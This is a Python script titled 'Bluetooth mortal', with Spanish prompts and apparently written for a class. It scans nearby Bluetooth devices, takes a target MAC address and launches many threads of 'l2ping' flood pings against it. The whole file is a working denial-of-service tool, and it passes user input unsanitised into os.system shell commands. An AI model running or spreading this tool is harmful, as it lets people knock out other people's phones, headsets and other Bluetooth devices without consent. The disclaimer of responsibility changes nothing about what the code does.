import os
import threading
import time
import subprocess
def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print('                            Bluetooth mortal                          ')
def main():
    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mno me hago responsable del uso de esta aplicacion despues de la clase')
    if (input("estas de acuerdo? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        print('')
        print("buscando ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        id = 0
        del lines[0]
        array = []
        print("|id   |   mac_addres  |   device_name|")
        for line in lines:
            info = line.split()
            mac = info[0]
            array.append(mac)
            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
            id = id + 1
        target_id = input('Target id or mac > ')
        try:
            target_addr = array[int(target_id)]
        except:
            target_addr = target_id


        if len(target_addr) < 1:
            print('[!] ERROR: objetivo perdido')
            exit(0)

        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: proporcione un numero entero')
            exit(0)


        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: proporcione un numero enteri por favor')
            exit(0)
       
        print('')
        os.system('clear')

        print("\x1b[31m[*] iniciando en 3 segundos...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] hilando...\n')

        for i in range(0, threads_count):
            print('[*] hilos creados №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] creando todos los hilos...')
        print('[*] iniciando...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] fallado')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))